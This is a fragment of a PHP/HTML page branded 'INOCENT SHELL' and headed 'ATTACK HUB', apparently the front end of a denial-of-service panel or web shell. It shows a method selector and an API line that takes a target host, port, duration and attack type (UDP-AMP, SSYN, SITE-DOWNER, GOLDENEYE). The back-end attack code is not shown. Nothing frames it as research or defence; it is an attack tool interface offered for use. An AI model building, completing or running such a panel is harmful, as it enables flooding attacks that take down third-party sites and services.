...
<center>
    <b style="font-size:44px;"><font color="#00FFFF">INO</font><font color="#0000FF">C</font><font color="#FF0000">ENT</font> <font color ="#000000">SHELL</font></b>
<br><br>
</center>
<div class="well">
<center>
    <?php if(empty($_GET['type'])) { ?><br>ATTACK HUB<br><br>
...
<select name="type">
    <optgroup label="= [ METODOS DE ATAQUE - INOCENT SHELL ] =">
...
<small>API: shell.php?host=[host]&port=[port]&time=[time]&type=[method (UDP-AMP/SSYN/SITE-DOWNER/GOLDENEYE)]</small>
<?php } ?>
